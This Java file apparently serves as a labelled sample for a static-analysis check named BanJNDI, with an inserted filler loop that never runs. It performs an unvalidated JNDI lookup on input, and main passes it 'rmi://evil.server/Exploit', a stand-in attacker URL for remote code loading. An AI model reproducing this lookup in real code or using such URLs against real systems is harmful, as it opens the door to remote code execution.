import javax.naming.Context;
import javax.naming.InitialContext;
import javax.naming.NamingException;

class BanJNDIBug {

    private boolean getUnreachableCondition() {
        return false;
    }

    public String showBug(String jndiUrl) throws NamingException {
        // Inserted unreachable while loop
        while (getUnreachableCondition()) {
            // This code is unreachable
            System.out.println("This is an unreachable while loop");
        }

        Context ctx = new InitialContext();
        Object object = ctx.lookup(jndiUrl); // BUG: BanJNDI
        return object.toString();
    }

    public static void main(String[] args) throws NamingException {
        BanJNDIBug bug = new BanJNDIBug();
        String userInput = "rmi://evil.server/Exploit";
        System.out.println(bug.showBug(userInput));
    }
}